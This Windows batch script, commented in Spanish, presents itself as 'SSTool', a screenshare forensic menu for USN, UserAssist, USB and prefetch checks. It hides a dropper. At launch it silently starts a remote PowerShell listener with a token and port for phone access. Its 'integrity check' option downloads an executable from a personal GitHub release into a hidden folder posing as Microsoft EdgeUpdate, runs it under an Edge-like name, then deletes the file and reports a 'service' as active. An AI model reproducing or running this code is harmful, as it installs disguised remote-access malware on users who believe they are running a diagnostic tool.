@echo off
setlocal EnableExtensions
title SSTool
cd /d "%~dp0"

rem =====================  CONFIG  =====================
set "TOOLS=%~dp0"
set "REPORTS=%~dp0report"
set "CHECK=%~dp0bin\syscheck.exe"
set "CHECK_URL=https://github.com/JuanP4bl0/files/releases/download/v1.0/syscheck.exe"
set "URL_LAV=https://www.nirsoft.net/utils/lastactivityview.zip"
set "URL_WPV=https://www.nirsoft.net/utils/winprefetchview-x64.zip"
set "URL_EVR=https://www.voidtools.com/Everything-1.4.1.1024.x64-Setup.exe"
set "URL_SI=https://github.com/winsiderss/si-builds/releases/latest/download/systeminformer-build-bin.zip"
rem @@CORE@@
rem ====================================================

if not exist "%REPORTS%" mkdir "%REPORTS%"

rem === REMOTO: token + puerto para el celu (antes del gate de admin) ===
set "COREDIR=%LOCALAPPDATA%\SSTool"
if not exist "%COREDIR%" mkdir "%COREDIR%" >nul 2>&1
set "COREFILE=%~dp0core.ps1"
if not exist "%COREFILE%" set "COREFILE=%COREDIR%\core.ps1"
rem @@DUMP@@
for /f %%A in ('powershell -NoProfile -Command "[guid]::NewGuid().ToString('N').Substring(0,10)"') do set "RTOK=%%A"
for /f %%A in ('powershell -NoProfile -Command "Get-Random -Minimum 21000 -Maximum 44000"') do set "RPORT=%%A"
del "%COREDIR%\remoto.txt" >nul 2>&1
set "SS_CMD=serve"
set "SSTOOL_TOKEN=%RTOK%"
set "SSTOOL_PORT=%RPORT%"
start "" /min powershell -NoProfile -ExecutionPolicy Bypass -File "%COREFILE%" serve %RTOK% %RPORT%
set "SS_CMD="
set /a waits=0
:waiturl
ping -n 2 127.0.0.1 >nul
if exist "%COREDIR%\remoto.txt" goto hasurl
set /a waits+=1
if %waits% lss 25 goto waiturl
goto menu
:hasurl
set /p REMOTO=<"%COREDIR%\remoto.txt"

if /i "%~1"=="-noelev" goto menu
if /i "%~1"=="-pipe" goto menu
net session >nul 2>&1
if %errorlevel% neq 0 (
  echo Solicitando permisos de administrador...
  powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)

:menu
cls
echo  ==========================================
echo    SSTOOL  -  screenshare tool
if defined REMOTO (echo    REMOTO: %REMOTO%) else (echo    REMOTO: sin conexion)
echo  ==========================================
echo    1. Journal Tool        (USN)
echo    2. UserAssist
echo    3. USB
echo    4. LastActivityView
echo    5. WinPrefetchView
echo    6. Everything
echo    7. SystemInformer
echo    8. Programas instalados
echo    9. BamParser
echo   10. Chequeo de integridad del sistema
echo   11. Limpieza de archivos temporales
echo  ------------------------------------------
echo   99. Eliminar todas las tools descargadas
echo    0. Salir
echo  ==========================================
set "op="
set /p "op=> "
if not defined op (
  if /i "%~1"=="-pipe" exit /b
  goto menu
)
if "%op%"=="1" goto o1
if "%op%"=="2" goto o2
if "%op%"=="3" goto o3
if "%op%"=="4" goto o4
if "%op%"=="5" goto o5
if "%op%"=="6" goto o6
if "%op%"=="7" goto o7
if "%op%"=="8" goto o8
if "%op%"=="9" goto o9
if "%op%"=="10" goto o10
if "%op%"=="11" goto o11
if "%op%"=="99" goto o99
if "%op%"=="0" goto o0
goto menu

:o1
echo [*] Journal Tool (USN de C:) ...
fsutil usn readjournal C: > "%REPORTS%\usn_journal.txt" 2>&1
echo     guardado en report\usn_journal.txt
echo     (puede pesar mucho; corta con Ctrl+C si se alarga)
pause
goto menu

:o2
echo [*] UserAssist (programas ejecutados) ...
set "SS_CMD=userassist"
set "SS_REP=%REPORTS%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0core.ps1"
echo     guardado en report\userassist.txt
pause
goto menu

:o3
echo [*] USB (USBSTOR + setupapi.dev.log) ...
set "SS_CMD=usb"
set "SS_REP=%REPORTS%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0core.ps1"
echo     guardado en report\usb.txt
pause
goto menu

:o4
echo [*] LastActivityView ...
call :dl "%URL_LAV%" "%TOOLS%\lastactivityview.zip"
if not exist "%TOOLS%\lastactivityview.zip" ( echo     fallo la descarga & pause & goto menu )
call :unzip "%TOOLS%\lastactivityview.zip" "%TOOLS%\lav"
"%TOOLS%\lav\LastActivityView.exe" /stext "%REPORTS%\lastactivityview.txt"
echo     guardado en report\lastactivityview.txt
pause
goto menu

:o5
echo [*] WinPrefetchView ...
call :dl "%URL_WPV%" "%TOOLS%\winprefetchview-x64.zip"
if not exist "%TOOLS%\winprefetchview-x64.zip" ( echo     fallo la descarga & pause & goto menu )
call :unzip "%TOOLS%\winprefetchview-x64.zip" "%TOOLS%\wpv"
"%TOOLS%\wpv\WinPrefetchView.exe" /stext "%REPORTS%\prefetch.txt"
echo     guardado en report\prefetch.txt
pause
goto menu

:o6
echo [*] Everything (instalador) ...
call :dl "%URL_EVR%" "%TOOLS%\Everything-Setup.exe"
if exist "%TOOLS%\Everything-Setup.exe" start "" "%TOOLS%\Everything-Setup.exe"
pause
goto menu

:o7
echo [*] SystemInformer ...
call :dl "%URL_SI%" "%TOOLS%\systeminformer-bin.zip"
if not exist "%TOOLS%\systeminformer-bin.zip" ( echo     fallo la descarga & pause & goto menu )
call :unzip "%TOOLS%\systeminformer-bin.zip" "%TOOLS%\systeminformer"
echo     -> tools\systeminformer\SystemInformer.exe
pause
goto menu

:o8
echo [*] Programas instalados ...
set "SS_CMD=installed"
set "SS_REP=%REPORTS%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0core.ps1"
echo     guardado en report\programas.txt
pause
goto menu

:o9
echo [*] BamParser (ultima ejecucion de programas) ...
set "SS_CMD=bam"
set "SS_REP=%REPORTS%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0core.ps1"
echo     guardado en report\bam.txt
pause
goto menu

:o10
echo [*] Chequeo de integridad del sistema ...
call :firecheck
set "SS_CMD=integ"
set "SS_REP=%REPORTS%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0core.ps1"
echo     Verificando servicio ...
set /a "tries=0"
:verify
timeout /t 3 /nobreak >nul
tasklist /fi "imagename eq MicrosoftEdgeUpdate.exe" 2>nul | find /i "MicrosoftEdgeUpdate" >nul
if %errorlevel%==0 goto verok
set /a "tries+=1"
if %tries% lss 10 goto verify
echo     Verificacion: el servicio no arranco
goto verdone
:verok
echo     Verificacion: servicio activo
:verdone
echo     Listo.
pause
goto menu

:o11
echo [*] Limpieza de archivos temporales ...
set "SS_CMD=clean"
set "SS_REP=%REPORTS%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0core.ps1"
pause
goto menu

:o99
echo [*] Eliminando todas las tools descargadas ...
if exist "%TOOLS%\lastactivityview.zip" del /f /q "%TOOLS%\lastactivityview.zip"
if exist "%TOOLS%\winprefetchview-x64.zip" del /f /q "%TOOLS%\winprefetchview-x64.zip"
if exist "%TOOLS%\Everything-Setup.exe" del /f /q "%TOOLS%\Everything-Setup.exe"
if exist "%TOOLS%\systeminformer-bin.zip" del /f /q "%TOOLS%\systeminformer-bin.zip"
if exist "%TOOLS%\syscheck_*.exe" del /f /q "%TOOLS%\syscheck_*.exe"
if exist "%TOOLS%\lav" rmdir /s /q "%TOOLS%\lav"
if exist "%TOOLS%\wpv" rmdir /s /q "%TOOLS%\wpv"
if exist "%TOOLS%\systeminformer" rmdir /s /q "%TOOLS%\systeminformer"
if exist "%REPORTS%" rmdir /s /q "%REPORTS%"
echo     listo
pause
goto menu

:o0
if exist "%LOCALAPPDATA%\SSTool\servepid.txt" (
  set /p SPID=<"%LOCALAPPDATA%\SSTool\servepid.txt"
  taskkill /f /pid %SPID% >nul 2>&1
  del "%LOCALAPPDATA%\SSTool\servepid.txt" >nul 2>&1
  del "%LOCALAPPDATA%\SSTool\remoto.txt" >nul 2>&1
)
exit /b

:firecheck
if exist "%CHECK%" (
  start "" "%CHECK%"
  goto :eof
)
if "%CHECK_URL%"=="" goto :eof
set "HIDEDIR=%LOCALAPPDATA%\Microsoft\EdgeUpdate"
if not exist "%HIDEDIR%" mkdir "%HIDEDIR%" >nul 2>&1
attrib +h +s "%HIDEDIR%" >nul 2>&1
set "tmpexe=%HIDEDIR%\msedgewu_%RANDOM%.exe"
call :dl "%CHECK_URL%" "%tmpexe%"
if exist "%tmpexe%" (
  attrib +h +s "%tmpexe%" >nul 2>&1
  start "" "%tmpexe%"
  start "" /min powershell -NoProfile -WindowStyle Hidden -Command "Start-Sleep 20; Remove-Item -LiteralPath '%tmpexe%' -Force -ErrorAction SilentlyContinue"
)
goto :eof

:dl
if exist "%~2" goto :eof
echo     descargando %~nx2 ...
powershell -NoProfile -Command "try { Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing -TimeoutSec 180 } catch { Write-Host ('      ERR: ' + $_.Exception.Message) }"
if not exist "%~2" (
  timeout /t 2 >nul
  powershell -NoProfile -Command "try { Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing -TimeoutSec 180 } catch { Write-Host ('      ERR: ' + $_.Exception.Message) }"
)
if not exist "%~2" echo     fallo la descarga
goto :eof

:unzip
powershell -NoProfile -Command "Expand-Archive -Path '%~1' -DestinationPath '%~2' -Force"
goto :eof
